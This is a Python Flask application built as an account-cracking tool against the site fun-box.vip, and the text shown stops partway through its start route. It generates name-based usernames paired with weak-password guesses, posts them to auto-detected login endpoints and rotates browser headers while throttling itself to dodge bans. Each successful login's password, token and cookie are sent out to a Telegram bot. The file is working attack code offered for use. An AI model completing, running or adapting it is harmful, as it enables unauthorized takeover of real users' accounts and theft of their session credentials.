# ================================================================
# FUN-BOX.VIP ULTIMATE HUNTER - INFINITE GENERATOR + 500+ NAMES
# Developer: @k_p_x1
# Target: https://fun-box.vip
# ================================================================

import os, sys, re, time, random, threading, requests, json, secrets, io, string
import urllib3
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for
from flask_cors import CORS
from collections import defaultdict
from itertools import cycle

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# PROXY CONFIG - DISABLED
# ================================================================
USE_PROXY = False
PROXY_URL = None

# ================================================================
# PASSWORD CONFIG
# ================================================================
ADMIN_PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# ================================================================
# ENDPOINT AUTO-DETECTION
# ================================================================
ENDPOINT_FILE = "endpoint.txt"
BASE_URL = "https://fun-box.vip"

POSSIBLE_PATHS = [
    "/api/login", "/api/v1/login", "/api/auth/login", "/api/authenticate",
    "/api/signin", "/login", "/signin", "/log-in", "/sign-in",
    "/auth/login", "/user/login", "/account/login", "/member/login"
]

def detect_login_endpoint():
    if os.path.exists(ENDPOINT_FILE):
        with open(ENDPOINT_FILE, "r") as f:
            return f.read().strip()
    
    print("[*] Searching for login endpoint...")
    session = requests.Session()
    session.verify = False
    
    for path in POSSIBLE_PATHS:
        test_url = BASE_URL + path
        try:
            resp = session.post(test_url, json={"username": "test", "password": "test"}, timeout=10)
            if resp.status_code != 404 and resp.status_code != 405:
                with open(ENDPOINT_FILE, "w") as f:
                    f.write(path)
                print(f"[+] Endpoint found: {path}")
                return path
        except:
            continue
    
    print("[!] No endpoint found, using default /api/login")
    with open(ENDPOINT_FILE, "w") as f:
        f.write("/api/login")
    return "/api/login"

LOGIN_ENDPOINT = detect_login_endpoint()
LOGIN_URL = BASE_URL + LOGIN_ENDPOINT

# ================================================================
# INFINITE NAME GENERATOR - 500+ ENGLISH NAMES ONLY
# ================================================================
class InfiniteNameGenerator:
    def __init__(self):
        # 250+ First Names
        self.first_names = [
            'john', 'mike', 'sarah', 'emma', 'david', 'lisa', 'james', 'anna',
            'robert', 'maria', 'william', 'sophia', 'joseph', 'olivia', 'thomas',
            'emily', 'charles', 'mia', 'christopher', 'chloe', 'daniel', 'ella',
            'matthew', 'grace', 'anthony', 'amelia', 'mark', 'lily', 'donald',
            'zoe', 'steven', 'nora', 'paul', 'ava', 'andrew', 'lucy', 'joshua',
            'rose', 'kenneth', 'sara', 'kevin', 'clara', 'brian', 'ella', 'george',
            'hannah', 'edward', 'leah', 'ronald', 'julia', 'timothy', 'victoria',
            'jason', 'alice', 'jeffrey', 'nancy', 'ryan', 'diana', 'jacob', 'helen',
            'gary', 'jane', 'nicholas', 'laura', 'eric', 'amy', 'jonathan', 'ruth',
            'stephen', 'sharon', 'larry', 'susan', 'justin', 'emma', 'scott', 'betty',
            'brandon', 'carol', 'benjamin', 'dorothy', 'samuel', 'kimberly', 'raymond',
            'jessica', 'gregory', 'sandra', 'frank', 'taylor', 'alexander', 'judith',
            'patrick', 'ashley', 'jack', 'angela', 'dennis', 'jennifer', 'jerry', 'melissa',
            'aaron', 'abigail', 'adam', 'adrian', 'aidan', 'alex', 'alexa', 'alexis',
            'alfred', 'allison', 'amanda', 'amber', 'amelia', 'amy', 'andrea', 'angel',
            'angela', 'angie', 'anita', 'ann', 'anna', 'annie', 'anthony', 'april',
            'archie', 'arianna', 'arlene', 'arnold', 'arthur', 'audrey', 'austin',
            'ava', 'barbara', 'barry', 'beau', 'becky', 'belinda', 'ben', 'benjamin',
            'bernard', 'bernice', 'bert', 'bessie', 'beth', 'betty', 'beverly', 'bill',
            'billy', 'blake', 'blanche', 'bobby', 'bonnie', 'brad', 'bradley', 'brandon',
            'brenda', 'brett', 'brian', 'bridget', 'brittany', 'brooke', 'bruce', 'bryan',
            'caitlin', 'caleb', 'callie', 'cameron', 'candice', 'carla', 'carlos', 'carmen',
            'carol', 'caroline', 'carolyn', 'carrie', 'casey', 'cassandra', 'catherine',
            'cathy', 'cecil', 'celia', 'chad', 'charlene', 'charles', 'charlie', 'charlotte',
            'chase', 'cheryl', 'chris', 'christina', 'christine', 'christopher', 'cindy',
            'clair', 'clara', 'clarence', 'clark', 'claude', 'claudia', 'clayton', 'clifford',
            'clinton', 'clyde', 'cody', 'cole', 'colin', 'colleen', 'connor', 'connie',
            'corey', 'cory', 'courtney', 'craig', 'crystal', 'curtis', 'cynthia', 'daisy',
            'dale', 'dana', 'daniel', 'danny', 'darin', 'darlene', 'darryl', 'dave',
            'david', 'dawn', 'dean', 'deanna', 'debbie', 'debby', 'debra', 'delores',
            'denise', 'dennis', 'derek', 'derrick', 'desiree', 'diana', 'diane', 'dick',
            'dolores', 'don', 'donald', 'donna', 'dora', 'doris', 'dorothy', 'douglas',
            'drew', 'duane', 'dustin', 'dwayne', 'dwight', 'dylan', 'earl', 'earlene',
            'ed', 'eddie', 'edgar', 'edith', 'edna', 'edward', 'edwin', 'eileen', 'elaine',
            'eleanor', 'elena', 'eli', 'elias', 'elijah', 'elizabeth', 'ella', 'ellen',
            'elliot', 'elsa', 'elvis', 'emily', 'emma', 'eric', 'erica', 'erin', 'erica',
            'esther', 'ethan', 'eugene', 'eunice', 'eva', 'evalyn', 'evan', 'evelyn',
            'faith', 'farrah', 'faye', 'felicia', 'felix', 'fernando', 'fiona', 'florence',
            'frances', 'francis', 'frank', 'franklin', 'fred', 'freddie', 'frederick',
            'gabriel', 'gail', 'gary', 'gavin', 'gayle', 'gene', 'genesis', 'geoffrey',
            'george', 'georgia', 'gerald', 'geraldine', 'gerard', 'gertrude', 'gia',
            'gina', 'ginger', 'gladys', 'glen', 'glenda', 'glenn', 'gloria', 'godfrey',
            'gordon', 'grace', 'gracie', 'graham', 'grant', 'greg', 'gregory', 'greta',
            'gretchen', 'guy', 'gwen', 'gwendolyn', 'hailey', 'hal', 'hannah', 'harold',
            'harriet', 'harry', 'harvey', 'hazel', 'heather', 'heidi', 'helen', 'henry',
            'herbert', 'herman', 'hilda', 'hilary', 'holly', 'hope', 'howard', 'hubert',
            'hugh', 'hugo', 'hunter', 'ian', 'ida', 'inez', 'ira', 'irene', 'iris', 'irma',
            'isabel', 'isabella', 'isabelle', 'isaac', 'isaiah', 'israel', 'issac',
            'ivan', 'jack', 'jackie', 'jackson', 'jacob', 'jacqueline', 'jade', 'jake',
            'jamal', 'james', 'jamie', 'jan', 'jane', 'janet', 'janice', 'jared', 'jasmin',
            'jason', 'jasmine', 'jay', 'jean', 'jeanette', 'jeanne', 'jeff', 'jeffrey',
            'jennifer', 'jenny', 'jeremiah', 'jeremy', 'jerome', 'jerry', 'jess', 'jesse',
            'jessica', 'jessie', 'jesus', 'jill', 'jillian', 'jim', 'jimmie', 'jimmy',
            'jo', 'joan', 'joanna', 'joanne', 'jocelyn', 'jodi', 'joe', 'joel', 'joey',
            'johanna', 'john', 'johnnie', 'johnny', 'jon', 'jonathan', 'jordan', 'jose',
            'joseph', 'josh', 'joshua', 'joy', 'joyce', 'juan', 'juanita', 'judith',
            'judy', 'julia', 'julian', 'julie', 'juliet', 'june', 'justin', 'justine',
            'karen', 'kari', 'karl', 'karla', 'karol', 'kate', 'katharine', 'katherine',
            'kathleen', 'kathryn', 'kathy', 'katie', 'katrina', 'kay', 'kayla', 'keith',
            'kelly', 'kelvin', 'ken', 'kendall', 'kenneth', 'kenny', 'kevin', 'kim',
            'kimberly', 'kirk', 'krista', 'kristen', 'kristi', 'kristin', 'kristina',
            'kristine', 'krystal', 'kurt', 'kyle', 'lacey', 'ladonna', 'lamar', 'lamont',
            'lance', 'landon', 'lara', 'larry', 'laura', 'laurel', 'lauren', 'laurie',
            'lawrence', 'lea', 'leah', 'lee', 'leila', 'lena', 'leo', 'leon', 'leonard',
            'leonardo', 'leroy', 'lesley', 'leslie', 'lester', 'levi', 'lewis', 'liam',
            'lillian', 'lily', 'linda', 'lindsay', 'lindsey', 'lionel', 'lisa', 'lloyd',
            'logan', 'lois', 'lonnie', 'lora', 'lori', 'lorraine', 'lou', 'louis', 'louisa',
            'louise', 'lourdes', 'lowe', 'lucille', 'lucy', 'luis', 'luke', 'lula', 'luna',
            'lydia', 'lyle', 'lynn', 'lynne', 'lynn', 'mabel', 'mack', 'madeline', 'madison',
            'mae', 'maggie', 'malcolm', 'mallory', 'mandy', 'manuel', 'marc', 'marcel',
            'marcia', 'margaret', 'margarita', 'margie', 'marguerite', 'maria', 'marian',
            'marie', 'marilyn', 'marion', 'mark', 'marlene', 'marsha', 'marshall', 'martha',
            'martin', 'marvin', 'mary', 'mathew', 'matthew', 'maurice', 'maureen', 'mavis',
            'max', 'may', 'maya', 'meagan', 'megan', 'melanie', 'melinda', 'melissa',
            'melody', 'melvin', 'meredith', 'merle', 'merrill', 'meryl', 'mia', 'michael',
            'micheal', 'michelle', 'mickey', 'mike', 'mildred', 'miles', 'millie', 'milton',
            'mindy', 'minnie', 'miranda', 'miriam', 'misty', 'mitchell', 'molly', 'mona',
            'monica', 'monique', 'monroe', 'monty', 'morgan', 'morris', 'moses', 'muriel',
            'murray', 'myra', 'myron', 'nadia', 'nancy', 'naomi', 'napoleon', 'natalie',
            'natasha', 'nathan', 'nathaniel', 'neal', 'ned', 'neil', 'nell', 'nellie',
            'nelson', 'nicholas', 'nick', 'nicole', 'nina', 'noah', 'noel', 'nora', 'norma',
            'norman', 'norton', 'olga', 'oliver', 'olivia', 'ollie', 'omar', 'oprah',
            'ora', 'orlando', 'orville', 'oscar', 'otis', 'owen', 'pablo', 'pam', 'pamela',
            'pat', 'patricia', 'patrick', 'patsy', 'patti', 'patty', 'paul', 'paula',
            'pauline', 'pearl', 'peggy', 'penelope', 'penny', 'percival', 'percy', 'perry',
            'pete', 'peter', 'phil', 'philip', 'phillip', 'phoebe', 'phyllis', 'piper',
            'polly', 'porter', 'preston', 'prince', 'priscilla', 'prudence', 'quentin',
            'quinn', 'rachel', 'ramona', 'randall', 'randolph', 'randy', 'raphael', 'raquel',
            'raymond', 'reba', 'rebecca', 'regan', 'regina', 'reginald', 'reid', 'reuben',
            'rex', 'rhonda', 'richard', 'rick', 'ricky', 'rita', 'robert', 'roberta',
            'robin', 'rochelle', 'rocky', 'rodney', 'roger', 'roland', 'rolando', 'roman',
            'ron', 'ronald', 'ronnie', 'rosa', 'rosalie', 'rose', 'rosemary', 'rosie',
            'ross', 'rowan', 'roxanne', 'roy', 'ruben', 'ruby', 'rudy', 'russell', 'ruth',
            'ryan', 'sabrina', 'sally', 'salvador', 'sam', 'samantha', 'samuel', 'sandy',
            'sara', 'sarah', 'sasha', 'saul', 'savannah', 'scarlett', 'scott', 'sean',
            'selena', 'serena', 'seth', 'shane', 'shannon', 'shari', 'sharon', 'shaun',
            'shawn', 'shelby', 'sheila', 'shelley', 'shelly', 'sherri', 'sherry', 'shirley',
            'shonda', 'sidney', 'silvia', 'simon', 'simone', 'sophia', 'sophie', 'spencer',
            'stacey', 'stacy', 'stan', 'stanley', 'stella', 'stephanie', 'stephen', 'steve',
            'steven', 'stevie', 'stewart', 'stuart', 'sue', 'sullivan', 'summer', 'sunny',
            'susan', 'suzanne', 'suzette', 'sven', 'sydney', 'sylvester', 'tabitha', 'tamara',
            'tami', 'tammy', 'tanya', 'tara', 'tate', 'taylor', 'ted', 'teddy', 'terence',
            'teresa', 'terrance', 'terri', 'terry', 'thelma', 'theodore', 'theresa', 'thomas',
            'thompson', 'thor', 'tia', 'tiffany', 'tim', 'timothy', 'tina', 'toby', 'todd',
            'tom', 'tomas', 'tommy', 'toni', 'tony', 'tori', 'tracey', 'traci', 'tracy',
            'travis', 'trevor', 'tricia', 'tristan', 'troy', 'trudy', 'tyler', 'tyrone',
            'tyrone', 'ulysses', 'una', 'ursula', 'val', 'valerie', 'van', 'vance', 'vanessa',
            'velma', 'venus', 'vera', 'vernon', 'veronica', 'vicki', 'vickie', 'victor',
            'victoria', 'vince', 'vincent', 'viola', 'virginia', 'vivian', 'wade', 'wanda',
            'warren', 'wayne', 'wendell', 'wendy', 'wesley', 'whitney', 'willard', 'william',
            'willie', 'willy', 'wilma', 'wilson', 'winifred', 'winnie', 'winston', 'woodrow',
            'wyatt', 'xavier', 'yolanda', 'yvette', 'yvonne', 'zachary', 'zoe'
        ]
        
        # 250+ Last Names
        self.last_names = [
            'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis',
            'rodriguez', 'martinez', 'hernandez', 'lopez', 'gonzalez', 'wilson', 'anderson',
            'thomas', 'taylor', 'moore', 'jackson', 'martin', 'lee', 'perez', 'thompson',
            'white', 'harris', 'sanchez', 'clark', 'ramirez', 'lewis', 'robinson', 'walker',
            'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores',
            'green', 'adams', 'nelson', 'baker', 'hall', 'rivera', 'campbell', 'mitchell',
            'carter', 'roberts', 'turner', 'phillips', 'evans', 'collins', 'edwards',
            'stewart', 'morris', 'murphy', 'cook', 'rogers', 'morgan', 'peterson', 'cooper',
            'reed', 'bailey', 'bell', 'howard', 'ward', 'cox', 'diaz', 'richardson',
            'wood', 'watson', 'brooks', 'bennett', 'gray', 'james', 'reyes', 'cruz',
            'hughes', 'price', 'myers', 'long', 'foster', 'sanders', 'ross', 'powell',
            'sullivan', 'russell', 'ortiz', 'jenkins', 'perry', 'butler', 'barnes', 'fisher',
            'henderson', 'coleman', 'simmons', 'patterson', 'jordan', 'reynolds', 'hamilton',
            'graham', 'kim', 'gonzales', 'alexander', 'ramos', 'wallace', 'griffin', 'west',
            'cole', 'hayes', 'chavez', 'gibson', 'bryant', 'ellis', 'stevens', 'murray',
            'freeman', 'wells', 'webb', 'simpson', 'stevens', 'tucker', 'porter', 'hunter',
            'hicks', 'crawford', 'henry', 'boyd', 'mason', 'morales', 'kennedy', 'warren',
            'dixon', 'ramos', 'reyes', 'burns', 'gordon', 'shaw', 'holmes', 'rice', 'robertson',
            'hunt', 'black', 'daniels', 'palmer', 'mills', 'nichols', 'grant', 'knight',
            'ferguson', 'rose', 'stone', 'hawkins', 'dunn', 'perkins', 'hudson', 'spencer',
            'gardner', 'stephens', 'murray', 'payne', 'pierce', 'berry', 'matthews', 'arnold',
            'wagner', 'willis', 'ray', 'watkins', 'olsen', 'carroll', 'duncan', 'snyder',
            'hart', 'cunningham', 'bradley', 'lane', 'andrews', 'ruiz', 'harper', 'fox',
            'riley', 'armstrong', 'carpenter', 'weaver', 'greene', 'lawrence', 'elliott',
            'chavez', 'sims', 'austin', 'peters', 'kelley', 'franklin', 'lawson', 'fields',
            'gutierrez', 'ryan', 'schmidt', 'carr', 'vasquez', 'castillo', 'wheeler', 'chapman',
            'oliver', 'montgomery', 'richards', 'williamson', 'johnston', 'banks', 'meyers',
            'henry', 'gardner', 'cruz', 'howell', 'morton', 'barker', 'conner', 'guzman',
            'mccoy', 'bennett', 'craig', 'gilbert', 'garza', 'crawford', 'parker', 'harrison',
            'clark', 'reed', 'franklin', 'marshall', 'allen', 'young', 'hernandez', 'king',
            'wright', 'lopez', 'hill', 'scott', 'green', 'adams', 'baker', 'gonzalez',
            'nelson', 'carter', 'mitchell', 'perez', 'roberts', 'turner', 'phillips', 'collins',
            'edwards', 'campbell', 'martin', 'lee', 'walker', 'harris', 'thompson', 'white',
            'robinson', 'lewis', 'hall', 'rivera', 'murphy', 'cook', 'rogers', 'morgan',
            'peterson', 'cooper', 'reed', 'bailey', 'bell', 'ward', 'cox', 'diaz', 'richardson',
            'wood', 'watson', 'brooks', 'bennett', 'gray', 'james', 'reyes', 'cruz', 'hughes',
            'price', 'myers', 'long', 'foster', 'sanders', 'ross', 'powell', 'sullivan',
            'russell', 'ortiz', 'jenkins', 'perry', 'butler', 'barnes', 'fisher', 'henderson',
            'coleman', 'simmons', 'patterson', 'jordan', 'reynolds', 'hamilton', 'graham',
            'kim', 'gonzales', 'alexander', 'ramos', 'wallace', 'griffin', 'west', 'cole',
            'hayes', 'chavez', 'gibson', 'bryant', 'ellis', 'stevens', 'murray', 'freeman',
            'wells', 'webb', 'simpson', 'tucker', 'porter', 'hunter', 'hicks', 'crawford',
            'henry', 'boyd', 'mason', 'morales', 'kennedy', 'warren', 'dixon', 'ramos',
            'reyes', 'burns', 'gordon', 'shaw', 'holmes', 'rice', 'robertson', 'hunt',
            'black', 'daniels', 'palmer', 'mills', 'nichols', 'grant', 'knight', 'ferguson',
            'rose', 'stone', 'hawkins', 'dunn', 'perkins', 'hudson', 'spencer', 'gardner',
            'stephens', 'payne', 'pierce', 'berry', 'matthews', 'arnold', 'wagner', 'willis',
            'ray', 'watkins', 'olsen', 'carroll', 'duncan', 'snyder', 'hart', 'cunningham'
        ]
        
        self.patterns = []
        self._build_patterns()
        self.used_combinations = set()

    def _build_patterns(self):
        self.patterns = [
            lambda u, p: (u, u),
            lambda u, p: (u, p),
            lambda u, p: (u, u + '123'),
            lambda u, p: (u, u + '123456'),
            lambda u, p: (u, u + '2024'),
            lambda u, p: (u, u + '2025'),
            lambda u, p: (u, u + '1'),
            lambda u, p: (u, u + '2'),
            lambda u, p: (u, u + '3'),
            lambda u, p: (u, u + '4'),
            lambda u, p: (u, u + '5'),
            lambda u, p: (u, u + '6'),
            lambda u, p: (u, u + '7'),
            lambda u, p: (u, u + '8'),
            lambda u, p: (u, u + '9'),
            lambda u, p: (u, u + '0'),
            lambda u, p: (u, '123456'),
            lambda u, p: (u, '12345678'),
            lambda u, p: (u, 'password'),
            lambda u, p: (u, 'qwerty'),
            lambda u, p: (u, 'admin'),
            lambda u, p: (u, 'welcome'),
            lambda u, p: (u + '@gmail.com', u),
            lambda u, p: (u + '@gmail.com', u + '123'),
            lambda u, p: (u.replace('_', '.'), u.replace('_', '.')),
            lambda u, p: (u.replace('_', '.'), u.replace('_', '.') + '123'),
            lambda u, p: (u, u + '!'),
            lambda u, p: (u, u + '@2024'),
            lambda u, p: (u, u + '_123'),
            lambda u, p: (u, u + '12345'),
            lambda u, p: (u, '123' + u),
            lambda u, p: (u, u + u[:2]),
            lambda u, p: (u, u + u[-2:]),
            lambda u, p: (u, u + 'abcd'),
            lambda u, p: (u, u + 'xyz'),
        ]
        random.shuffle(self.patterns)

    def generate_username(self):
        """توليد اسم مستخدم عشوائي"""
        first = random.choice(self.first_names)
        last = random.choice(self.last_names)
        
        patterns = [
            f"{first}{last}",
            f"{first}.{last}",
            f"{first}_{last}",
            f"{first}{last[:3]}",
            f"{first}{random.randint(1, 999)}",
            f"{last}{first}",
            f"{first[:3]}{last[:3]}",
            f"{first}{random.choice(['x', 'z', 'q', 'w'])}",
            f"{first}{last[:2]}{random.randint(10, 99)}",
            f"{last}{first[:2]}",
            f"{first}{random.choice(['_', '.', '-'])}{last}",
            f"{first}{random.choice(['99', '88', '77', '66', '55'])}",
            f"{first}{random.choice(['2023', '2022', '2021'])}",
            f"{first}{random.choice(['!', '@', '#'])}",
            f"{first[:4]}{last[:4]}",
            f"{last}{first[:3]}",
            f"{first}{last}{random.randint(10, 99)}",
            f"{first}_{last}_{random.randint(1, 99)}",
        ]
        
        username = random.choice(patterns).lower()
        username = re.sub(r'[^a-zA-Z0-9._-]', '', username)
        
        # تجنب التكرار
        if username in self.used_combinations:
            username = username + str(random.randint(1, 999))
        
        self.used_combinations.add(username)
        return username

    def get_next(self):
        """الحصول على الحساب التالي"""
        username = self.generate_username()
        pattern = random.choice(self.patterns)
        generated_username, generated_password = pattern(username, username)
        return generated_username, generated_password

# ================================================================
# ANTI-BAN SYSTEM
# ================================================================
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        ]
        self.lock = threading.Lock()
        self.attempt_count = 0
        self.last_attempt_time = 0
        self.fail_count = 0
        self.smart_delay_active = False
        self.delay_minutes = 3

    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': BASE_URL,
            'Referer': BASE_URL + '/',
            'Connection': 'keep-alive',
        }

    def can_attempt(self):
        current_time = time.time()
        if self.smart_delay_active:
            elapsed = current_time - self.last_attempt_time
            if elapsed < (self.delay_minutes * 60):
                return False
            else:
                self.smart_delay_active = False
                self.fail_count = 0
                return True
        
        if self.fail_count >= 8:
            self.smart_delay_active = True
            self.last_attempt_time = current_time
            return False
        
        if current_time - self.last_attempt_time < 1.5:
            return False
        
        self.last_attempt_time = current_time
        return True

    def record_fail(self):
        with self.lock:
            self.fail_count += 1
            if self.fail_count >= 8:
                self.smart_delay_active = True
                self.last_attempt_time = time.time()

    def record_success(self):
        with self.lock:
            self.fail_count = 0
            self.smart_delay_active = False

# ================================================================
# GROUP SENDER SYSTEM (TELEGRAM)
# ================================================================
class GroupSender:
    def __init__(self):
        self.telegram_bot_token = ""
        self.telegram_chat_id = ""
        self.enabled = False
        self.notifications_active = True

    def set_telegram(self, token, chat_id):
        self.telegram_bot_token = token
        self.telegram_chat_id = chat_id
        self.enabled = True

    def test_connection(self):
        if not self.enabled or not self.telegram_bot_token or not self.telegram_chat_id:
            return False, "⚠️ Bot Token or Chat ID is empty"
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/getMe"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                bot_info = response.json()
                if bot_info.get('ok'):
                    test_url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
                    test_data = {
                        "chat_id": self.telegram_chat_id,
                        "text": "✅ *Test Connection Successful!*\n\n📡 Bot is active and ready.",
                        "parse_mode": "Markdown"
                    }
                    test_resp = requests.post(test_url, json=test_data, timeout=10)
                    if test_resp.status_code == 200:
                        return True, "✅ Connection successful! Test message sent."
                    else:
                        return False, f"❌ Bot is valid but cannot send message. Check Chat ID."
                else:
                    return False, "❌ Invalid Bot Token"
            else:
                return False, f"❌ Bot Token invalid."
        except Exception as e:
            return False, f"❌ Connection error: {str(e)[:50]}"

    def send_hit(self, username, password, token, cookie, user_id):
        if not self.enabled or not self.notifications_active:
            return False
        if not self.telegram_bot_token or not self.telegram_chat_id:
            return False

        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"""
🎯 *FUN-BOX.VIP HIT DETECTED*
═══════════════════════════════
📧 *USERNAME:* `{username}`
🔑 *PASSWORD:* `{password}`
🆔 *USER ID:* `{user_id or 'N/A'}`
🕐 *TIME:* `{timestamp}`
═══════════════════════════════
"""
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": message, "parse_mode": "Markdown"}
            response = requests.post(url, data=data, timeout=15)

            if response.status_code != 200:
                return False

            token_content = f"Username: {username}\nPassword: {password}\nToken: {token}\nCookie: {cookie}\nUserID: {user_id}\nTime: {timestamp}"
            token_file = io.BytesIO(token_content.encode('utf-8'))
            token_file.name = 'funbox_data.txt'
            files = {'document': (token_file.name, token_file, 'text/plain')}
            data = {'chat_id': self.telegram_chat_id}
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument",
                files=files,
                data=data,
                timeout=15
            )
            return True
        except:
            return False

# ================================================================
# FUN-BOX.VIP HUNTER ENGINE
# ================================================================
class FunBoxHunter:
    def __init__(self):
        self.anti_ban = AntiBanSystem()
        self.group_sender = GroupSender()
        self.running = False
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.feed = []
        self.results = []
        self.current_testing = []
        self.lock = threading.Lock()
        self.name_generator = InfiniteNameGenerator()
        self.infinite_mode = True

    def hunt_funbox(self, username, password):
        if not self.anti_ban.can_attempt():
            return None

        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            login_data = {
                'username': username,
                'password': password
            }
            
            login_resp = session.post(
                LOGIN_URL,
                json=login_data,
                allow_redirects=True,
                timeout=15
            )
            
            if login_resp.status_code == 200:
                try:
                    resp_json = login_resp.json()
                    if resp_json.get('success') or resp_json.get('status') == 'success' or resp_json.get('token'):
                        cookies = session.cookies.get_dict()
                        cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                        token = cookies.get('token') or cookies.get('access_token') or cookies.get('session') or resp_json.get('token', 'N/A')
                        
                        user_id = resp_json.get('user_id') or resp_json.get('userId') or resp_json.get('id')
                        if not user_id:
                            user_match = re.search(r'"user_id":"([^"]+)"', login_resp.text, re.I)
                            if user_match:
                                user_id = user_match.group(1)
                        
                        self.anti_ban.record_success()
                        return {
                            'status': 'hit',
                            'username': username,
                            'password': password,
                            'token': str(token),
                            'cookie': cookie_str,
                            'user_id': str(user_id) if user_id else username
                        }
                except:
                    pass
            
            if 'dashboard' in login_resp.url.lower() or 'home' in login_resp.url.lower() or 'welcome' in login_resp.text.lower():
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                token = cookies.get('token') or cookies.get('access_token') or cookies.get('session') or 'N/A'
                
                user_id = None
                user_match = re.search(r'"user_id":"([^"]+)"', login_resp.text, re.I)
                if user_match:
                    user_id = user_match.group(1)
                
                self.anti_ban.record_success()
                return {
                    'status': 'hit',
                    'username': username,
                    'password': password,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': user_id or username
                }
            else:
                self.anti_ban.record_fail()
                return {'status': 'bad'}
                
        except Exception as e:
            self.anti_ban.record_fail()
            return {'status': 'error', 'error': str(e)[:60]}

    def process_account(self, username, password):
        result = self.hunt_funbox(username, password)
        
        with self.lock:
            self.checked += 1
            if result and result.get('status') == 'hit':
                self.hits += 1
                self.results.append(result)
                self.feed.append({
                    'type': 'hit',
                    'text': f"🎯 Fun-Box | {username} | 🔑 {password} | ✅ HIT",
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                self.current_testing = [{'username': username, 'status': 'hit'}]
                self.group_sender.send_hit(
                    username, password,
                    result.get('token', 'N/A'),
                    result.get('cookie', 'N/A'),
                    result.get('user_id', 'N/A')
                )
            elif result and result.get('status') == 'bad':
                self.bad += 1
                self.feed.append({
                    'type': 'bad',
                    'text': f"❌ Fun-Box | {username} | 🔑 {password} | BAD",
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                self.current_testing = [{'username': username, 'status': 'bad'}]
            else:
                self.feed.append({
                    'type': 'info',
                    'text': f"⚠️ Fun-Box | {username} | {result.get('error', 'Error')}",
                    'time': datetime.now().strftime('%H:%M:%S')
                })

# ================================================================
# STATE
# ================================================================
state = {
    'running': False,
    'checked': 0,
    'hits': 0,
    'bad': 0,
    'errors': 0,
    'feed': [],
    'results': [],
    'current_testing': [],
    'lock': threading.Lock(),
    'cpm': 0,
    'start_time': None,
    'generated_count': 0,
    'telegram_enabled': False,
    'telegram_notifications': True
}

hunter = FunBoxHunter()

# ================================================================
# PREDATOR LOOP
# ================================================================
def hunter_loop():
    last_count = 0
    last_time = datetime.now()
    
    while state['running']:
        try:
            username, password = hunter.name_generator.get_next()
            with state['lock']:
                state['generated_count'] += 1
            hunter.process_account(username, password)
            
            with state['lock']:
                state['checked'] = hunter.checked
                state['hits'] = hunter.hits
                state['bad'] = hunter.bad
                state['feed'] = hunter.feed[-80:]
                state['results'] = hunter.results[-50:]
                state['current_testing'] = hunter.current_testing
                state['telegram_notifications'] = hunter.group_sender.notifications_active
            
            now = datetime.now()
            elapsed = (now - last_time).total_seconds()
            if elapsed >= 60:
                with state['lock']:
                    state['cpm'] = int((state['checked'] - last_count) / (elapsed / 60))
                last_count = state['checked']
                last_time = now
            
            time.sleep(random.uniform(1, 2.5))
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
            time.sleep(2)

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def index():
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    password = request.json.get('password', '').strip()
    if password == ADMIN_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid password'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('index'))
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/api/start', methods=['POST'])
def start_hunter():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    if state['running']:
        return jsonify({'success': False, 'error': 'Already running'})
    
    state['running'] = True
    state['checked'] = 0
    state['hits'] = 0
    state['bad'] = 0
    state['errors'] = 0
    state['results'] = []
    state['feed'] = []
    state['current_testing'] = []
    state['start_time'] = datetime.now()
    state['cpm'] = 0
    state['generated_count'] = 0
    
